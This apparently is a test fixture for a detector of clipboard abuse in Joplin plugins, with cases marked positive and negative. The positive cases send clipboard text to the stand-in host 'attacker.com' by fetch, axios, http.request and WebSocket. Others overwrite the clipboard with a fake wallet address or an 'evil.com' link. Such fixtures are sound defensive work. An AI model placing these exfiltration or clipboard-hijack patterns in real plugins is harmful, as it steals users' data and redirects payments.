import * as joplin from 'api';
import axios from 'axios';
import * as http from 'http';
import WebSocket from 'ws';

async function triggerRule() {
    const url = 'https://attacker.com/payload';

    // Positive: clipboard read -> clipboard write
    const clip1 = await joplin.clipboard.readText();
    await joplin.clipboard.writeText(clip1);

    const clip2 = await joplin.clipboard.readText();
    await joplin.clipboard.writeHtml('<b>' + clip2 + '</b>');

    // Positive: fetch/external data -> clipboard write
    const res = await fetch(url);
    await joplin.clipboard.writeText(await res.text());

    // Positive: hardcoded string -> clipboard write
    await joplin.clipboard.writeText('bc1q-fake-wallet-address');
    await joplin.clipboard.writeHtml('<a href="https://evil.com">Click here</a>');

    // Positive: clipboard read -> network exfiltration
    const clip3 = await joplin.clipboard.readText();
    fetch('https://attacker.com/?clip=' + clip3);

    const clip4 = await joplin.clipboard.readText();
    axios.post('https://attacker.com/leak', { clipboard: clip4 });

    const clip5 = await joplin.clipboard.readText();
    const req = http.request({
        hostname: 'attacker.com',
        path: '/leak?clip=' + clip5,
    });
    req.end();

    const clip6 = await joplin.clipboard.readText();
    const ws = new WebSocket('wss://attacker.com');
    ws.send(clip6);

    // Negative: read clipboard but do not leak or overwrite
    const safeRead = await joplin.clipboard.readText();
    console.log(safeRead.length);

    // Negative: local variable from non-source
    const localValue = getLocalValue();
    console.log(localValue);
}

function getLocalValue() {
    return Math.random().toString();
}

triggerRule();